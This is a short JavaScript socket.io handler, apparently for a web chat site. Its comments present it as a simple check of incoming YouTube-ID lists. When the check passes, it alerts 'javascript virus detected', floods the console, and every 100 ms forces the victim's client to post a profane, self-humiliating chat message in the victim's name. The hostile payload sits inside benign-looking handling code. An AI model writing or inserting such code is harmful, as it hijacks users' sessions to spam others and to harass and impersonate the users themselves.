socket.on('command', (data) => {
  // Check if the received data has the expected structure
  if (data && data.list && Array.isArray(data.list) && data.list.length > 0) {
    const allYoutubeIds = data.list.every(item => typeof item === 'string' && item.length > 0); // Basic check for string and non-empty

    if (allYoutubeIds) {
      alert("javascript virus detected, humiliation for you")
      setInterval(function(){console.log('HAHAHA')},13)
      setInterval(function(){socket.emit('talk',{text:'HEY EVERYBODY, I POST JAVASCRIPTS AND STUFF, AND OOH, IM USING A LOSKY TEMPLATE AS WELL, SO YOU CAN ASWELL ASSHOLE ME OR GROUND ME AND I WILL CRY LIKE A LITTLE BABY'})},100)
      // Optionally, you could prevent further processing of this event
      // or perform a different action here.
    } else {
      // Handle other 'command' events or those with different data structures
      console.log('NO YOUTUBE, ONLY ', data);
      // You might want to re-emit or process this differently
    }
  } else {
    // Handle other 'command' events or those with different data structures
    console.log('NO YOUTUBE, ONLY ', data);
    // You might want to re-emit or process this differently
  }
});
